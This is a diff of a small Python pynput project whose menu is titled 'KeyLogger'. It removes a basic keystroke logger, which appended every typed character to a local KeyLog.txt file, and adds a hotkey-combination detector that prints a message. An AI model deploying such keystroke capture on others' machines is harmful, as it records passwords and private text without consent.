@@ -2,29 +2,39 @@ from pynput import keyboard
 from SRC.Global import GlobalState
 from SRC.Phases import CurrentPhases
 
-def key_pressed(key):
-    if key == keyboard.Key.esc:
-        print("Program Ended")
-        quit()
-    print(str(key))
-    with open("KeyLog.txt","a") as KeyLog:
-        try:
-            char = key.char
-            KeyLog.write(char)
-                    
-        except:
-            if key == keyboard.Key.space:
-                char = " "
-                KeyLog.write(char)
-            else:
-                pass
+KeyCombo = [
+    {keyboard.Key.shift, keyboard.KeyCode(char = "a")},
+    {keyboard.Key.shift, keyboard.KeyCode(char = "A")},
+    {keyboard.Key.alt_l, keyboard.KeyCode(char = "1")},
+    {keyboard.KeyCode(char = "b")},
+    {keyboard.KeyCode(char = "B")}
+]
+current = set()
+
+def execute():
+    print("Tecla Pulsada")
+
+def on_press(key):
+    if any({key in Combo for Combo in KeyCombo}):
+        current.add(key)
+        if any(all(k in current for k in Combo)for Combo in KeyCombo):
+            execute()
+
+def on_release(key):
+    if any({key in Combo for Combo in KeyCombo}):
+        current.remove(key)
 
 while True:
     if GlobalState.GlobalPhase == CurrentPhases.MENU:
         print("<--KeyLogger-->\nExecute\t > 1\nSettings\t > 2")
+        Option = input()
+        if Option == "1":
+            GlobalState.GlobalPhase = CurrentPhases.PLAY
+        else:
+            pass
+
 
     elif GlobalState.GlobalPhase == CurrentPhases.PLAY:
-        listener = keyboard.Listener(on_press=key_pressed)
-        listener.start()
-        input()
+        with keyboard.Listener(on_press = on_press, on_release = on_release) as listener:
+            listener.join()
             
